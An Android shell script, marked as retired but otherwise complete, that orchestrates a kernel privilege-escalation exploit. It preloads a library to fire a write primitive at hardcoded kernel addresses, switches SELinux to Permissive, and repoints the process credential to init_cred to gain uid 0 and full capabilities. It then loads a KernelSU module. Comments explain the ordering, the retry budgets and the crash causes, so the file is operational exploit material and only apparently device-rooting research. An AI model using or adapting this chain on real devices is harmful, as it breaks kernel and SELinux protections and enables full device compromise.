#!/system/bin/sh
# ⚠️ 已退役 2026-08-16 — 禁止直接运行 (防误跑闸门见下)
#   事故记录: 本文件在 mt48 轮被就地改成 PTR_ALT 模式但 SRC 未随版本升级,
#   曾以 mt47 的 .so 配 mt48 的 env 跑出错配实验 (现场提醒, 已核实)。
#   mt48 (进程内 ALT) 已被 crash#2 判死 (同进程二触中毒树), 当前主脚本:
#     test_mt49_root.sh  (一进程一写: STAGE-R/STAGE-C 独立进程 + 状态文件衔接)
#   本文件仅作 mt47→mt48 演化历史档案。
echo "!! RETIRED: 本脚本已退役 (mt48 ALT 模式 + SRC 错配隐患), 请用 test_mt49_root.sh" >&2
exit 1

# mt47 终局三步: R0 判活 → ENF 全局 Permissive → PTR cred指针→init_cred(满caps)
#
# 顺序原理 (ELF 实证, 见 MT47_ROUTE_DECISION_2026-08-16.md):
#   - ENF 先做: sel_write_enforce 只查 avc SID(与 caps/uid 无关),
#     用户态 setenforce 不可靠 → mt26 零写是唯一正路; 先翻全局 Permissive,
#     之后 root 子进程的 insmod 重试无时序竞争
#   - PTR 后做: STORE(a) [task+0x780]=init_cred 一发拿满 caps(0x1fffffffffffffff)
#     + 全部 id=0; 子进程 CapEff 命中 → setresuid(0) 私有化 cred →
#     PSELECT_KO 存在则 finit_module 重试(签名不强制, is_module_sig_enforced=0)
#   - FIX 可选: init_cred usage/uid 被 STORE(b) 副作用污染(无害), 预算富余再补
#
# 预算: R0(1) + ENF(≤4) + PTR(≤4) = ≤9 轮, 与 8-16 上午成功 boot 的预算一致
# 判读:
#   R0 灭 → 换 boot, 别浪费后续轮
#   ENF 4轮仍 Enforcing → 零写在 selinux_state 不落地(新卡点), PTR 照跑但 insmod 会卡 avc
#   PTR 后 root_alive 出现 → ★ cred 指针路线成立
#   PTR 后 ksu_done 出现 → ★★★★ 终局达成

SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt47.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt47_root.txt
RUNLOG=/data/local/tmp/mt47_run.out
KO=/data/local/tmp/kernelsu.ko

rm -f $DST; cp $SRC $DST; sync
BID0=$(cat /proc/sys/kernel/random/boot_id)
rm -f /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt
rm -f /data/local/tmp/root_marker.txt /data/local/tmp/root_shell.txt
echo "start $(date +%H:%M:%S) boot_before=$BID0 enforce=$(getenforce)" > $LOG
am kill-all 2>&1 | tail -1 >> $LOG

echo "=== R0: liveness oracle (mt47c: 3轮判活, 单轮命中率~20-40% per mt25 历史) ===" >> $LOG
R0OK=0
for R0N in 1 2 3; do
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a60bb0 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  BID=$(cat /proc/sys/kernel/random/boot_id)
  echo "R0 round=$R0N rc=$? boot_id=$BID" >> $LOG
  if [ "$BID" != "$BID0" ]; then R0OK=1; echo "R0: ALIVE (round=$R0N)" >> $LOG; break; fi
  sleep 3
done
if [ $R0OK -eq 0 ]; then
  echo "!! R0: 3轮全灭 — 原语未激活, 换 boot 重跑" >> $LOG
  exit 1
fi
sleep 3

echo "=== ENF: 全局 Permissive (mt26 配方) ===" >> $LOG
E=0
while [ "$(getenforce 2>/dev/null)" = "Enforcing" ] && [ $E -lt 4 ]; do
  E=$((E+1))
  rm -f $RUNLOG
  timeout 120 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_RETRY=1 \
    PSELECT_TREE_PC=ffffff8002a41b90 \
    PSELECT_TREE_LEFT=0 \
    LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
  echo "ENF round=$E rc=$? enforce=$(getenforce)" >> $LOG
  grep -a 'futex trigger\|WRITE PRIMITIVE' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  sleep 3
done

echo "=== PTR mt48: 两轮换指针 (进程内 R/C 交替, 同一 task, 满帽 AND-gate) ===" >> $LOG
KOARG=""
[ -f $KO ] && KOARG="PSELECT_KO=$KO"
[ -n "$KOARG" ] && echo "ko found: $KO" >> $LOG || echo "no ko at $KO (只验 root, 不 insmod)" >> $LOG
P=0
while [ ! -f /data/local/tmp/root_alive.txt ] && [ ! -f /data/local/tmp/ksu_done.txt ] && [ $P -lt 2 ]; do
  P=$((P+1))
  rm -f $RUNLOG
  # mt48: 单进程内 6 次尝试交替 R(real_cred)/C(cred) — 两写必须落同一 task,
  # 所以不能像旧 PTR 那样每轮换进程。子进程满帽 AND-gate: 半程态不引爆
  # commit_creds BUG_ON (今天 7/7 崩溃的机制)。
  timeout 300 env \
    PSELECT_SLIDE_TRIGGER=1 \
    PSELECT_CRED=1 \
    PSELECT_PERF_CRED=1 \
    PSELECT_RETRY=6 \
    PSELECT_PTR_MODE=1 \
    PSELECT_PTR_ALT=1 \
    PSELECT_PTR_STRICT=1 \
    $KOARG \
    LD_PRELOAD=$DST /system/bin/sleep 240 > $RUNLOG 2>&1
  echo "PTR round=$P rc=$?" >> $LOG
  grep -a 'mt47:\|mt48:\|mt39:\|mt40:\|futex trigger\|SLIDE page' $RUNLOG | sed 's/\x1b\[[0-9;]*m//g' >> $LOG
  # mt47b: PTR 后立即抓 pstore (若设备未崩, 无害; 若上轮崩过重启, 这里能拿到上一 boot 的 panic 栈)
  for PS in /sys/fs/pstore/console-ramoops-0 /sys/fs/pstore/dmesg-ramoops-0; do
    if [ -f $PS ]; then
      echo "--- pstore: $PS (last 60 lines) ---" >> $LOG
      tail -60 $PS >> $LOG 2>/dev/null
    fi
  done
  [ -f /data/local/tmp/root_alive.txt ] && echo "★★★ PTR round=$P ROOT-ALIVE: $(cat /data/local/tmp/root_alive.txt) ★★★" >> $LOG
  [ -f /data/local/tmp/ksu_done.txt ] && echo "★★★★ PTR round=$P KSU-LOADED ★★★★" >> $LOG
  sleep 3
done

# === 可选 FIX 轮 (预算富余才放开) ===
# rm -f $RUNLOG
# timeout 120 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 \
#   PSELECT_RETRY=1 PSELECT_FIX_MODE=1 \
#   LD_PRELOAD=$DST /system/bin/sleep 70 > $RUNLOG 2>&1
# echo "FIX rc=$?" >> $LOG

sleep 5
echo "=== final uid=$(id -u) enforce=$(getenforce) root_alive=$([ -f /data/local/tmp/root_alive.txt ] && echo YES || echo no) ksu=$([ -f /data/local/tmp/ksu_done.txt ] && echo YES || echo no) ===" >> $LOG
echo "=== DONE $(date +%H:%M:%S) ===" >> $LOG
